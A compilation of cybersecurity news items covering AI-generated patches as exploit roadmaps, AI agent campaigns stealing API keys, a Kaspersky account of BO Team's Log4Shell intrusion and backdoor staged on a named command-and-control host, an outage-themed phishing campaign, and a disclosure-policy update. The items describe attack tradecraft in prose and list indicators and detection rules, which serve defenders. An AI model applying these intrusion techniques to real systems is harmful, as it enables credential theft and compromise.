Title: AI-written patches are becoming attack maps for hackers
Context: Then the first agent attacked the patched programs again, looking for a different way to trigger the same flaw
Full Text:
This summer, the maintainers of vm2, an open-source JavaScript sandboxing library with 1 million downloads per week, shipped fixes for 34 separate sandbox-escape vulnerabilities and Anthropic’s Claude co-wrote 19 of them. Weeks later, a security researcher pointed an AI agent at one of the advisories and asked for a way around the patch. The agent delivered.

Shayaun Nejad, lead product security engineer at Rubrik, ran vulnerability variant analysis on the vm2 patch while preparing for a talk he held at the recent [un]prompted AI security conference in San Francisco. He wanted to highlight the challenges his development team faced when dealing with a flood of AI-discovered vulnerabilities, and noted that the same bugs kept being rediscovered later in new testing runs despite being fixed by AI-assisted pipelines.

“Sometimes the [vulnerability] variant wouldn’t be caught until the model variation got better or the model used chaining analysis at a higher degree once it improved in order to find those variants,” he said. “Sometimes it was in the exact same spot, sometimes it was something that was related, that was a neighbor, but variant analysis is basically something that has been popping up, and it’s a context magnet, too.”

With the rate of published CVEs higher than ever due to AI assistance, software developers are actually disclosing the types of vulnerabilities their platforms are susceptible to, and the patches for these flaws can serve as blueprints for attackers, Nejad warned. Sometimes it’s as simple as pointing an AI agent at a codebase with its historical vulnerabilities as context and telling it to go hunt for variants, he said.

Rubrik’s experience reflects a broader asymmetry that other researchers have observed in recent months: AI models have become very good at offense — finding vulnerabilities and building exploits — while their defensive skills, such as writing secure code and correct patches, have lagged behind.

Also at the [un]prompted conference, OpenAI security researcher Tim de Waal showed how an AI agent patched two vulnerabilities in the firmware of a network access point. For one issue, the agent rebuilt the vulnerable function without the stack canaries the original code had, silently removing a defensive protection. For the other, the generated patch filtered out double-quote characters in the attacker input but missed that using single quotes would have bypassed the fix.

Controlled studies found the same issue at scale. When researchers at 1Password’s Off-by-1 Labs used AI agents to repeatedly generate patches for the same six known vulnerabilities in complex open-source projects, about half of the 6,080 resulting patch candidates left at least one attack path open, with agents sometimes missing identical instances of the same bug in other parts of the code.

More recently, in a benchmark test called P2Patch, researchers pitted two AI agents against each other: one wrote exploits for 101 real vulnerabilities, and the other patched the code until the exploits stopped working. Then the first agent attacked the patched programs again, looking for a different way to trigger the same flaw. In 41 of the 101 cases, it succeeded, sometimes multiple times for subsequent patches.

Of course, human-written patches are not infallible either. Security firm Trail of Bits reviewed the fixes developers submitted for 2,265 vulnerabilities found during its consulting assessments over several years and one in eight failed to fully resolve the reported issues.

In one case the company documented, a human maintainer and an AI agent working as part of the Patch the Planet initiative separately wrote patches for the same memory-safety bug in the freenginx web server, and both patches introduced the same crash during request cleanup.

Organizations turn to AI patching because humans can’t keep up

The issue is not that AI always writes worse patches than humans, although the failure rate of AI-written patches might be higher, but that the rate of vulnerability discovery is now so fast that humans alone can’t keep up. This is combined with the offensive capabilities of AI agents that enable attackers to analyze and reverse engineer patches at machine speed.

Seven months after launching its Mythos-powered Glasswing vulnerability-hunting program, Anthropic’s public ledger counted 37,966 findings. Only 217 of the 7,349 flaws that were made public had been fixed, according to a recent analysis from vulnerability intelligence firm VulnCheck. Not all findings turn out to be security vulnerabilities, but Anthropic claims a true positive rate of 94.2%, which, given the small number of fixes, highlights the deluge of reports that maintainers have to triage and deal with.

“Progress on software security used to be limited by how quickly we could find new vulnerabilities,” Anthropic wrote in its initial Glasswing update. “Now it’s limited by how quickly we can verify, disclose, and patch the large numbers of vulnerabilities found by AI.”

And this is not just a problem for open-source projects. After Bank of America let Anthropic’s models loose on its own systems, the bank added 1,000 outside contractors in the second quarter of this year to help with the patching work, on top of the roughly 3,000 existing staff. They were still on the job in October, CEO Brian Moynihan told CNBC.

By July, Meta was using AI to write fixes for 40% of its critical vulnerabilities, and almost half of those patches landed in production unchanged. Despite that, the exposure time did not go down, Meta software engineer David Molnar said in a separate presentation at [un]prompted. That’s because the AI-proposed patches still had to be reviewed by humans, while the amount of new code grew more than 100% year over year, with more than 80% of it attributed to AI coding agents.

“Everyone is drowning in stuff to review,” Molnar said, adding that his team has worked with directors and product managers internally to find more places where automation can be introduced, including in the review process, shifting it from human-in-the-loop to human-on-the-loop.

“You can automate everything upstream of AI, and then just completely overwhelm your poor humans on the other end,” he said. “Which is why you have to take a look at the entire pipeline and automate all of it.”

In June, the Forum of Incident Response and Security Teams (FIRST) projected around 66,000 CVE assignments for this year. With two months left, the number is already approaching 100,000. Microsoft’s October Patch Tuesday alone addressed 1,415 vulnerabilities compared to only 180 in October 2025.

Closed-source patches are not safe from AI analysis

If AI agents are scouring code repositories for vulnerability variants, one might be inclined to think that closed-source sofware, where the patch is usually inside a compiled binary, are safer. That’s not necessarily the case given that AI models are now also great at reverse engineering, and some people use them to create open-source replicas of complex proprietary products, for example Adobe Photoshop.

In June, when Anthropic’s researchers tested what an attacker can do with AI-assisted patch diffing, they gave a model nothing beyond what’s public on patch day. It produced a working exploit within an hour of a Firefox fix landing. On Windows, given vulnerable and patched binaries plus decompilation output, the same approach built eight full privilege-escalation chains from 21 kernel vulnerabilities for roughly $2,000 each.

“In some ways, N-days are the more dangerous of the two [compared to zero-days], because the patch itself provides a roadmap to the bug,” the Anthropic researchers said at the time.

A team of researchers from Fudan University in Shanghai, China, built an LLM-assisted binary diffing framework and analyzed 76 recent patches from 62 closed-source applications across 25 vendors. According to their paper published this month, the framework flagged 63 of the patches as incomplete and manually confirmed 56, of which 26 could be bypassed into new vulnerabilities, resulting in 19 CVE assignments and $28,100 in bug bounties.

Comparing a vulnerable build against a patched one to locate the changed code has been a standard practice for security researchers for years. The difference now is the speed and lack of skill needed thanks to AI. And even though the latest frontier AI models might have API guardrails that make reverse engineering or binary diffing harder, the open-weight models have become capable enough.

Taesoo Kim, vice president of security research at Microsoft, also warned during the [un]prompted conference that AI has drastically reduced the time needed for binary-diff analysis and exploit creation, and noted that Microsoft has to also be extremely careful when publishing CVEs and push updates quickly to customers.

The more recent frontier models have started refusing such binary analysis work due to stricter guardrails, but a lot of people use open-weight models instead, such as Qwen, Kimi, and GLM, because “they are extremely capable,” he said.

Exploiting the patch gap is now easy

Last month, the Microsoft Edge Security team warned that attackers are increasingly taking advantage of the time gap between when information about a potential vulnerability becomes available in a code commit or test release in one project and when the patch trickles down to other projects. Their report included examples of attackers exploiting security fixes revealed in Chromium builds, the open-source browser that serves as the base for Google Chrome, Microsoft Edge, and other browsers, before those fixes were integrated in those downstream browsers.

“This is patch-gap abuse,” the Edge team said. “The technique is not new, but the speed and expertise required is changing. AI-assisted analysis and exploit development could compress work that once took weeks into hours, increasing the chance that a usable exploit emerges while either exposure window remains open.”

Researchers from Epoch AI recently used GLM 5.3 to emulate an unsophisticated attacker and target the Firefox patch gap. Using about $1,000 in API credits and as little as 12 hours of work per target, it compromised every Firefox release shipped between Sept. 17 and Oct. 26. “We did not trigger any safeguards or refusals from any provider,” the researchers wrote.

In response, the Mozilla team has decided to take several actions to prevent patch gap abuse, for example by no longer releasing the regression tests associated with security fixes.

“We’ve observed that GLM 5.3 is much less effective at patch-gapping when a regression test is not present, so we’ve reintroduced a practice of keeping these confidential until after the fix has shipped,” Firefox CTO Bobby Holley wrote.

More diligence in patching, not less disclosure

In a report last month dubbed PatchSlop, security firm Terra found that the rate of incomplete or broken fixes across open-source projects increased eightfold this year.

“A patch that only blocks the reported input can give the impression the bug is addressed even if it’s still there in the underlying code,” the company’s researchers said. “It functions as a map for attackers, marking out both vulnerable code and what the defender thought the bug was. Looking just outside the diff (another encoding, another address range, another path into the same function) is one of the cheapest forms of bug hunting. We believe a growing share of attacker effort, and AI tokens, goes into exactly this.”

The answer is not for open-source projects and software companies to hide vulnerability details and stop publishing security advisories, but to produce better patches. And some researchers believe this is possible, even when patching gets automated with the help of AI agents.

In Rubrik’s case, after the company noticed that bugs it had marked as fixed kept coming back, Nejad’s team added its own variant hunting step that runs automatically in the pipeline after fixes are developed. The company began routing simple bugs to AI patching while reserving complex flaws, such as authentication bypasses, for human engineers.

“Yes, attackers do have that context, but you have that context first, and you can act on that,” Nejad said.

In a blog post this month, OpenAI noted that its Linux vulnerability research and patching pipeline needed iterative testing and variant analysis because initial patches “failed to examine related code for variants of the same vulnerability, leading to incomplete patches.”

“We recommend using models for adversarial review of human and AI-generated patches, which can identify issues such as the patch being bypassable, missing other attack paths or variants, and more,” the company’s researchers said.

The Open Source Security Foundation’s guidance for AI-assisted patching also advises teams to “have a new discovery agent probe the patch as an attacker” and Trail of Bits has released an agent skill that requires testing at least one distinct variant based on the bug’s root cause before a patch can be submitted.

“It is clear there needs to be greater diligence and rigor when patching vulnerabilities,” Terra CEO Shahar Peled told CSO. “This means finding the root cause of any flaw, searching across the codebase for similar bugs and re-testing the system to ensure the patch itself doesn’t introduce a new vulnerability.”

Title: Amazon Uncovers AI Agent Campaign Targeting LiteLLM, Dify, and Other Apps for API Keys
Context: In its RAGFlow case study, the company had only low confidence about which flaw, if any, let the attackers run code
Full Text:
Attackers' AI agents have been hunting for weak spots in internet-exposed AI apps such as LiteLLM, One API, and Dify to steal the AI provider keys stored inside, according to the agents' own records.

The records, which Amazon's threat intelligence team captured with decoy servers, describe stolen keys being used to run the AI models that powered the search for more keys.

The team said this week that it cannot verify the outcomes reported by the agents. It has moderate confidence that the agents ran on ARTEX, an open-source AI tool for penetration testing.

The records include a playbook of known entry points for each targeted product. It lists default administrator credentials such as LiteLLM's default master key, unfinished installs that an outsider could take over, and known flaws in Langflow and RAGFlow.

In a separate case reported this week, Cloudflare's incident responders saw ARTEX gain access to a compromised API token that had been used for CI/CD. The token had no IP restrictions or rate limiting, and the activity that followed included 400 database dump requests in an hour. The company has not said whether those requests returned any data.

An operator gives ARTEX a target and a goal, and a planner agent splits the goal into tasks for worker agents that run security tools. To decide each next step, the agents send their work to a large language model (LLM).

The decoy servers, part of a network called MadPot, posed as popular LLM services. From October 3 to late last week, the agents sent it requests that often carried a campaign's full history, including the operators' instructions and the agents' reported findings.

Those captured agent records describe work done on systems MadPot does not watch. "Amazon Threat Intelligence did not observe that activity as it happened and cannot verify the outcomes the agents reported, but the records show what the actors were pursuing," the team said.

The team assessed, with moderate confidence, that the operators were separate China-linked groups, citing Simplified Chinese prompts and China time zone settings, among other evidence.

In the main campaign, the agents looked for internet-exposed AI apps, extracted the provider keys stored inside, verified that the keys worked, and added them to a shared pool. They focused on apps that hold keys for many providers, because one weak admin page there can expose many accounts.

Targets named in the records include LLM gateways and proxies such as One API, New API, Veloera, Sub2API and LiteLLM, and AI app builders such as Dify, FastGPT, Langflow, RAGFlow, Open WebUI, LobeChat and Ollama.

The playbook also covers management and provider settings endpoints that need no login, an authentication bypass through the isCliRequest header in One API family systems, and server-side request forgery (SSRF) through URL-fetch features to reach cloud metadata services. Other entries cover secrets left in client-side JavaScript, source maps, debug routes and environment files.

When the agents found cloud credentials, they targeted managed services that host AI models, secret stores, and application identities, prioritizing premium AI models over general cloud access.

To find leaked keys, the agents used internet scanning services and certificate transparency logs, and searched GitHub repositories and event archives, npm and PyPI packages, container image layers, notebooks, model-hosting spaces, paste sites, and Telegram channels.

The records cover hundreds of targets across AI app platforms and other systems. The team notified AWS customers who may have been affected.

Microsoft reported last week that attackers were using agentic AI tools such as ARTEX for GitHub secret hunting, looking for exposed credentials that included API keys for AI inference.

On August 26, the company described an earlier RAGFlow attack, in which a hidden hook captured AI provider keys as users entered them, and a compromise of a LiteLLM gateway that exposed provider keys.

In its RAGFlow case study, the company had only low confidence about which flaw, if any, let the attackers run code. It did not link those attacks to ARTEX.

The decoy records also describe a second campaign in which agents attempted to bypass identity checks at two cryptocurrency exchanges using deepfakes.

One verification vendor's server rejected the live deepfake video on every attempt the agents made to record it. The team did not say whether the forged photos of ID documents that the agents also fabricated passed document checks.

Over the past eight weeks, Cloudflare's incident responders were called into multiple investigations involving ARTEX and tools built from it.

In more than one incident, an attacker gained access to a customer's environment with a major cloud provider and moved directly into the customer's Cloudflare account. The common root cause was static CI/CD tokens that never expired, granting broad access across the customer's cloud setup, according to the company.

In the ARTEX case, the compromised token was an account-level API token. The compromise most likely came through a third-party cloud provider, according to the company's incident findings. How the token was first stolen has not been disclosed.

New Worker scripts with names such as artex-*, artex-pgrecon-*, artex-pgw-* and artex-do-* appeared in the account, each name matching a different task. The activity ran at more than 69 requests per minute across several parts of the account. It included attempts to establish persistence and validate session tokens for other third-party apps.

Much of this activity was lightly guided by a human operator, the company believes. Whether any attempt at persistence worked has not been disclosed.

Over three days this week, more than 50 families of AI penetration testing frameworks tried to scan the company's customers, and the IP addresses seen running such frameworks now number in the thousands.

The FBI said in a FLASH alert this week that a range of attackers have used ARTEX since at least August against organizations in many sectors around the world. The alert summarizes 11 earlier reports and describes no new incident.

ARTEX's developer made its GitHub repository unavailable on October 8 after reports of abuse, but community forks, archived copies, and a commercial version called ARTEX PRO keep it available.

The alert's examples include an earlier campaign against South Korean financial institutions that stole personal information on about 67,000 people, and the ConnectWise compromise.

What Defenders Can Check

"None of the techniques in these campaigns were new. What AI agents change is the speed and persistence of the attacker," Amazon's threat intelligence team said. The agents succeeded where basic security was missing, including default or hard-coded credentials, keys left in code and public files, interfaces and inference endpoints without authentication, and unpatched software.

The team recommends treating AI apps, model gateways, and inference endpoints like other production systems, assuming that exposed secrets will be found quickly, and watching for misuse through unexpected spending or unusual usage.

Here is the status of the flaws named in the playbook:

Product

Flaw

Status

Langflow

CVE-2025-3248, missing authentication that lets a remote attacker run code

Versions before 1.3.0 are affected, and 1.3.0 is the fixed version ( release notes ). CISA added the flaw to its Known Exploited Vulnerabilities (KEV) catalog on May 5, 2025, after earlier Langflow exploitation , and the KEV entry marks it as known to be used in ransomware campaigns.

RAGFlow

CVE-2026-28797, server-side template injection (SSTI) that lets any logged-in user run operating system commands on the server. The attack needs a registered account, and self-registration is on by default, the security advisory says.

NVD lists 0.24.0 and earlier as affected. The advisory lists no patched version. Version 0.25.0, released on April 21, renders templates in the sandbox the advisory recommends, according to its SSTI fix notes .

One API family

Authentication bypass through the isCliRequest header

The team's report names no affected versions or fix.

Other checks that apply to these attacks:

Change default administrator credentials, such as LiteLLM's default master key, and do not leave a new install unfinished where an outsider could take it over.

Search configuration files, environment variables, deployment scripts, CI/CD pipelines and databases for embedded secrets, keep scanning repositories and container images for exposed ones, and rotate exposed credentials quickly, as the FBI advises.

Give Cloudflare API tokens an expiry date and limit the client IP addresses that can use them. Both are optional token restriction settings, and new tokens carry a cfut_ prefix that secret scanners can detect.

Look for Cloudflare Worker scripts named artex-*, artex-pgrecon-*, artex-pgw-* or artex-do-*.

Check logs for the 11 IP addresses published with the decoy findings, and for the more than 2,500 addresses that researchers at Cisco Talos link to ARTEX in their indicator files.

The researchers' detection rules for ARTEX are Snort 3 rules 7:76, 7:77 and 7:78, and Snort 2 rules 1:67494, 1:67495 and 1:67496. Rules 7:78 and 1:67496 are off by default and detect traces of norma, the agent harness ARTEX uses.

Title: Weekly Update 530: Email Dependencies & Apps
Context: You sign up with a provider and use as much of it as you need, when you need it, and the idea of it being unavailable for any extended period of time is foreign
Full Text: Email is just one of those utilities like power or water where you always expect it to just, well, to just be there. You sign up with a provider and use as much of it as you need, when you need it, and the idea of it being unavailable for any extended period of time is foreign. Microsoft's outage a few days ago was one of those exceptional circumstances, and whilst it absolutely rocked the whole internet, it's far from a reason not to decry using email for most of the things we currently apply it to. But it is a good time to look at where redundancy makes sense; maybe start with redundant channels for alerts about things that could hurt people!

Title: BO Team Exploits Log4Shell in VMware vCenter, Compromises Russian Firm's Code-Signing Server
Context: "We found numerous traces of BO Team connecting to various Windows servers, though the attackers only used malware in one case," Kaspersky explained
Full Text:
An investigation into suspicious activity within a Russian software developer's network has uncovered a months-long compromise of its development infrastructure and a software code-signing server.

The activity, documented by Kaspersky's ICS CERT team after it was contacted by the affected developer in June 2025, has been attributed to a threat actor named BO Team (aka Black Owl, Hoody Hyena, and Lifting Zmiy). The name of the targeted company was not disclosed, but it operates from within Russia and develops software that has a "customer base in the Russian Federation," according to Kaspersky.

Over the course of several months, the intrusion resulted in the theft of confidential information and the compromise of all components of the organization's IT infrastructure, including Windows and Linux servers, workstations, hypervisors, backup servers, security solution management servers, and network equipment.

Active since at least 2023, BO Team focuses on cyber espionage and hacktivism, and has a history of targeting Russian entities to steal valuable data and break into compromised infrastructure using tools like Mythic and Cobalt Strike, along with its own malware such as BrockenDoor and ZeronetKit. The group is assessed to be of Ukrainian origin.

"Their primary motivation is to degrade the Russian military-industrial complex to weaken Moscow's operational capabilities on the battlefield," Orange Cyberdefense said in an analysis of the group. "They also engage in cognitive warfare aimed at humiliating Russian institutions and demonstrating their vulnerability to Ukrainian digital resistance."

While BO Team is known to deploy ransomware and publicize its activities on a dedicated Telegram channel, the attack targeting the unspecified software developer did not involve any data destruction or public posts claiming responsibility for it.

"Instead, the attackers worked to entrench themselves in the victim's network by setting up convenient command channels and planting backdoors to restore access in case it was lost," Kaspersky said. "The compromise of the software development (CI/CD) infrastructure and the software code-signing server indicated that the attack would likely develop into a supply chain scenario."

The attack, per the Russian cybersecurity company, involved the threat actors compromising the organization's Linux terminal server by taking advantage of an exposed SSH service, and using it to conduct reconnaissance of the internal network to flag systems with accessible SMB, Kerberos, SSH, Telnet, FTP, HTTP, HTTPS, WinRM, and LDAP services.

The adversary has also been found unsuccessfully attempting to access internal portals, along with websites like proxy-sale[.]com, start.duckduckgo[.]com, vcsa.vmware[.]com, and vulners[.]com, among others.

Event logs show that the attackers further attempted to connect from the compromised terminal server to the virtualization system servers, including logging in to the VMware vCenter web interface. These sign-in efforts ended in failure.

However, the threat actor managed to successfully target a VMware vCenter server (version 7.0.3) vulnerable to CVE-2021-44228 (aka Log4Shell and LogJam), obtain a remote command line with root privileges, connect to the hypervisor over SSH, and identify accessible hosts.

This phase also involved the deployment of a backdoor on the hypervisor that was run every hour by planting a shell script in the "/etc/cron.hourly/" directory. The script carried the name "pgcache" in a likely attempt to disguise it as a legitimate PostgreSQL component.

The primary responsibility of the backdoor is to download and run a secondary shell script from "lo1yaizaeghaevarooD1ahtaichootae.nofrillsdns[.]com." The shell script is designed to download and run the Global Socket (GSocket) utility, enabling the attacker to gain remote control of the compromised host.

Select variants of the script have been found to point to a hostname-specific payload staged on "lo1yaizaeghaevarood1ahtaichootaz.nofrillsdns[.]com" to deliver an as-yet-undetermined next-stage payload.

"The attackers used the nofrillsdns[.]com service, which allows domain names to be created for free by calling the curl utility," Kaspersky said. "By default, when the malware's command-and-control server is not operating, the attackers set the corresponding DNS record to 127.0.0.1, which is what the script checks. Activating the backdoor requires only a change to the DNS record -- the script will then download and run the malware."

Some of the other post-exploitation actions undertaken by the BO Team following the backdoor deployment are listed below -

Gaining access to the corporate proxy server.

Abusing the certificate of the compromised hypervisor to connect to servers associated with a second virtualization cluster and place a similar backdoor.

Collecting information about virtual machines and firewall rules, accessing some of them via a command-line interpreter in the guest OS from the hypervisor.

Running an obfuscated bash script to decrypt and run an ELF binary designed to provide remote control over SSH.

Searching for secrets on the compromised virtual machines, allowing the attackers to breach the virtual machine of the GitLab software development platform, as well as gain access to some of the repositories containing source code and seize the server's private key.

Using the private key of the GitLab virtual machine to connect to the organization's Ansible orchestration system.

Using access to the Linux terminal server to locate credentials of several domain accounts and connect to the domain controller using the account of one of the system administrators after likely accessing the memory of virtual machines running on the compromised hypervisors.

Changing the security attributes of the user's Windows Downloads directory.

Using legitimate binaries like tasklist.exe, findstr.exe, taskmgr.exe, and ipconfig.exe to identify which security solutions were running on the system and to gather details about network interfaces.

Attempting to take a dump of the lsass.exe process using the Nanodump utility and obtain the credentials of domain administrators and other privileged users with access to the domain controller. The attackers deleted the event logs after the activity was detected and blocked by a security solution.

Using system utilities such as comsvcs.dll rather than established utilities like Mimikatz and Nanodump to create a memory dump of the lsass.exe process.

Dumping the system registry using the regedit.exe utility, and using it to decrypt the Active Directory domain database ("ntds.dit") to extract the credentials of all domain users.

Launching the OpenSSH scp.exe utility to transfer the collected information to the terminal server.

Logging in to the domain controller using the Kerberos ticket of one of the domain administrators and ultimately compromising the organization's entire Windows infrastructure by taking advantage of the fact that the same password was used for system administrator accounts in different domains.

Connecting to the terminal server over SSH using root account credentials after possibly stealing them from a system administrator's computer post obtaining domain administrator privileges.

Modifying "/usr/bin/nxnode-login" to intercept and write user credentials to a shared-memory file at "/dev/shm/pulse-shm-3088612174."

Successfully brute-forcing the password of the administrator's terminal server after about 2,500 failed attempts to place the private key of the Ansible system.

Complicating detection efforts by timestomping, obfuscation of malware code, usage of living-off-the-land (LotL) techniques, systematic deletion of event logs, and dressing up malware files as legitimate software.

"We found numerous traces of BO Team connecting to various Windows servers, though the attackers only used malware in one case," Kaspersky explained. "The server which apparently held particular interest for hackers, was used to sign compiled builds of the commercial software developed by the attacked organization."

"Attackers may be interested in such a server for two reasons. First, they may try to carry out a supply chain attack by injecting malicious code into a product build right before it is signed. Second, the attackers may try to steal the organization's digital signature to use later to sign malware."

It's suspected that the attackers likely attempted to execute a malicious WMI script and install a backdoor similar to the Linux variant in the temporary files directory.

But after the incident was detected and countermeasures were enacted, the attackers, after having lost access to the compromised infrastructure, orchestrated a phishing campaign towards the end of July in an attempt to collect employee credentials. The phishing email contained the "Account disconnected from the mail server" subject line and sought to trick the recipient into clicking on a link to change their password.

What's more, the email managed to bypass SPF and DKIM checks, indicating the attackers had in their possession a private key that was obtained after gaining control of the organization's mail server. The phishing attack was detected and prevented.

"The attackers used a service that automatically generates phishing pages," Kaspersky said. "The service loads the content of a targeted organization's official website and displays a password entry form on top of the official site's layout. After entering the password, the user sees an error message. However, the information is actually sent to the attacker."

"We repeatedly noted that the attackers tried not to use malware and hacking utilities in order to evade detection," Kaspersky said. "Instead, they actively used system tools such as RDP, SSH, and SCP, as well as system utilities to steal user credentials. This enabled them to develop the attack using legitimate accounts, which also matches the BO Team profile."

The activity has been found to originate from IP addresses 193.3.23[.]236 and 80.76.42[.]139, both of which belong to a provider in Ukraine. Further analysis into the malicious activity has revealed that the attackers followed a standard work schedule and operated in a time zone that differed "only slightly" from that of the victim Russian entity.

"Based on the totality of the circumstantial evidence, such as the attackers' interest in the source code repository and software build signing server, as well as their use of a software composition analysis (dependency analysis) platform, we believe that BO Team may have set out to inject malicious code into a solution released by the attacked organization in order to subsequently compromise its customers, i.e., carry out a so-called supply chain attack," Kaspersky concluded.

"Thanks to the rapid response measures applied after the incident was discovered, the attackers lost access to the compromised infrastructure and were apparently unable to bring the attack to its intended conclusion."

By: Jacob Malimban, Intelligence Team

Cofense Intelligence has identified an active phishing campaign exploiting confusion surrounding the Microsoft November 2026 outage to deliver a credential phishing attack. The email, supposedly from Microsoft and personalized using the recipient’s organization, claims that emails are unavailable due to disruptions to Exchange Online. The recipient is instructed to click the button to “Restore Messages”. Clicking on the button, however, redirects the user to a Microsoft 365-spoofing credential phishing page.

Threat actors move quickly on big news. The first sample was seen one day into the outage. By combining the recent outage news with their phishing attacks and likely with generative AI, the threat actors have quickly created an ongoing and likely effective campaign. After this outage, people expect email problems, so a message about stuck emails matches what they already expect, and they may check emails less carefully.

Email Content

Figure 1: Held message notification used in credential phishing. (ATR 426633)

This campaign email sends a fake held message notification with a button leading to a credential phishing site. The email, as shown in Figure 1, is styled like a legitimate Microsoft notification. The email appears to come from the organization’s “Outage Notification” based on the email recipient’s company. Recipients are informed that “messages are held and will be deleted within 24 hours unless released”, because threat actors use urgency to get victims to act. Clicking on the button in the email to “RESTORE MESSAGES” will redirect the email recipient to a Microsoft 365 credential phishing site instead.

Microsoft-Spoofing Sign-In Page

Figure 2: Microsoft credential phishing page used in campaign. (ATR 426633)

In prior campaigns, threat actors were already good at creating realistic login pages. As seen in Figure 2, the Microsoft credential phishing page used in this campaign is a good mimicry of the real Microsoft login page.

When a victim first submits credentials, the phishing page will say that the credentials are incorrect. If they try a second time, the page will redirect to Microsoft to obfuscate the fact that they were on a phishing page. Although this type of phishing lure has been used before, threat actors are combining it with breaking news regarding the outage to create a dangerous attack.

Cofense Intelligence provides early warning of emerging phishing campaigns through Flash Alerts like this one, giving security teams advance notice of new tactics, techniques, and procedures (TTPs) before they reach more inboxes. In this case, the campaign bypassed Abnormal Security, Mimecast, and Microsoft ATP. Despite the bypass of email security controls, employees trained using Cofense’s Security Awareness Training (SAT) were able to identify the phishing campaign emails like those found in ATR 426633.

Full Text: Hello and welcome to the Monday, November 16th, 2026 edition of the SANS Internet Storm Center's Stormcast. My name is Johannes Ullrich, recording today from Jacksonville, Florida. And this episode is brought to you by the SANS.edu Undergraduate Certificate Program in Cybersecurity Fundamentals. Well, Brad on Friday had a follow-up to a diary that Brad wrote in September. This diary talked about Macfinger, a ClickFix attack that then loads additional malware. Now, since then, Brad has learned about Huntress also writing about this particular malware and the malware actually being loaded by this attack. They're calling it DownTheDRAIN and yeah, it's a wallet drainer, meaning that it's going after crypto coin wallets and then draining your balance from these wallets. Brad has a quick walkthrough how the ClickFix part works, meaning the code that the user pastes into the terminal in order to download the malware. Of course, the user doesn't really know what's happening there. Now, on a good note, Brad noted that the particular attempt that he was playing with was blocked by Apple. And Apple, of course, in recent releases has sort of included some of the countermeasures against, in particular, sort of the ClickFix attacks where users are copy-pasting commands into the terminal. And then a little bit of follow-up to last week's Microsoft outage. Microsoft is now saying that they're seeing some phishing attacks attempting to leverage this outage. Essentially, these phishing emails will tell you that, well, due to the outage, there is like backed up or delayed email. And if you're not responding to this email, then those stored or queued emails may get deleted. So, very much a plausible issue and something that with all the news around the Microsoft outage, people may fall for. There was also an interesting sort of side story. Gebhard told me about this in Germany, where in a swimming pool, apparently, several people were injured by too high chlorine levels in the water. There was supposed to be an alarm message to go off to the maintainer of the swimming pool. But apparently, this message never made it because of the Microsoft outage. If you have any sort of life and safety systems like this, I wouldn't even blame Microsoft here in this case. But you should never have sort of a single point of failure in systems like this, like an email delivery service that, if failed, will cause harm to individuals. Luckily, nobody appears to be hurt seriously in this particular incident. Check Point has a write-up documenting some attacks that they have observed against Check Point Gateway that took advantage of the PHP2Shell vulnerability. These attacks apparently started showing up in late October, about a week after the patches were released. They also use a privilege escalation vulnerability in the DynamicCLI interface. The end result is, well, fairly classic. It's a web shell that's being dropped here. And then a proxy and a wiper and a couple other components are being implemented via this web shell. So, as I have mentioned before, you really need to look on your devices, on your web applications for these web shells. That's often the number one thing that's typically being deployed via these vulnerabilities, given that there are probably other vulnerabilities out there, not just PHP vulnerabilities. That appears to be sort of a fairly good generic test to make sure that you're not already compromised. It looks like today is becoming sort of a little bit of an update episode. We also have an update from Anthropic regarding the recent compromise of the official Anthropic Cursor plugin. It turns out, like so often, it started with a stolen credential. In this particular case, the credential was stolen from Fireworks.ai, a business intelligence platform. And then these credentials were basically used to, well, try to gain access to whatever they have access to. One of the things that the attacker did gain access to was communication with customers. And some of them included additional credentials. Now, what's also interesting here is that the Anthropic's monitoring did identify the unauthorized activity. They deactivated various keys and did try to rotate credentials. But apparently they missed one and that then led to the compromise of the extension. So really hard in an incident like this to identify all the credentials that were stolen and that have to be rotated. The more you can centralize this, probably the easier this gets. But still, that's also not always possible and definitely not always easy. Well, and that's it for today. Thanks for listening. Thanks for liking. Thanks for recommending and subscribing. And talk to you again tomorrow. Bye.

Title: Updating our coordinated vulnerability disclosure policy timelines
Context: We’re shortening the disclosure window in our coordinated vulnerability disclosure (CVD) policy from 90 days to 30 days for high- and critical-severity issues, and to 45 days...
Full Text:
Over the last several months, frontier models have become much better at discovering vulnerabilities. We remain optimistic that this will help defenders find and fix vulnerabilities faster than ever before. However, the speed at which AI is improving has changed how we think about our own disclosure practices.

We’re shortening the disclosure window in our coordinated vulnerability disclosure (CVD) policy from 90 days to 30 days for high- and critical-severity issues, and to 45 days for all other issues. The new timelines apply to vulnerabilities reported to vendors and maintainers on or after January 1, 2027. In-progress reports as of that date will keep their existing deadlines.

In addition to shortening the disclosure window, we are making two related changes. First, we will aim to escalate to an external vulnerability coordinator after 15 days instead of 30 if a maintainer does not respond to our initial vulnerability report. Second, we will wait 30 days instead of 45 after a patch is available before sharing full technical details. The rest of our policy remains the same.

Finally, there are high- and critical-severity vulnerabilities that we reported over 90 days ago and that now exceed the deadline in our current CVD policy that have not yet been disclosed publicly. We are now notifying the maintainers of these projects that we are providing them an additional 30 days, after which time we will publish these reports on our dashboard in line with our updated policy starting January 1, 2027.

Responding to AI-enabled vulnerability discovery

Many coordinated disclosure norms, including those found in our own policy, were developed well before AI could discover vulnerabilities. These policies assumed that fixes moved at human speed and that independent rediscovery of the same bug was unlikely. Neither assumption holds today. Models can now help develop fixes, and a bug that one model can find is increasingly likely to be found by another. We are seeing a higher rate of vulnerability rediscovery as these capabilities increase. A 90-day window made sense when a vulnerability could be expected to stay private for months. We no longer believe it can, and these changes are intended to keep pace with progress in AI capabilities and strike the right balance for defenders.

Some vulnerabilities still can’t be fixed quickly. Flaws in hard-to-deploy software, such as critical infrastructure, and flaws that require changes to a specification or RFC can’t always be resolved in 30 or 45 days. In these cases, we will work with the vendor on a remediation timeline. Our seven-day disclosure window for any vulnerability under active exploitation remains unchanged. This new policy update will not apply to AI-discovered findings that have not received human review, such as those found by OSS Scanner.

We recognize that shorter timelines may put more pressure on software maintainers. To reduce that burden, we will continue to include actionable guidance with each report, along with a patch or mitigation where possible, to best enable the maintainer to confirm a finding and fix the vulnerability. We will also continue to agree on a sustainable pace with maintainers before sending a large volume of findings to a single project.

We offer programs to help maintainers and defenders work at this new pace. Maintainers of critical open-source projects can apply to OSS Scanner, a no-cost service that periodically scans their code with our strongest models and sends them findings directly. Eligible maintainers and contributors can apply to the Claude for Open Source Program for six months of Claude Ultra at no cost. And security professionals, including open-source maintainers, can apply to our Cyber Verification Program, which tailors Claude’s safeguards to enable legitimate defensive work.

Title: Italy Fines Meta €805 Million Over Facebook's Android Gallery Access Without Explicit Consent
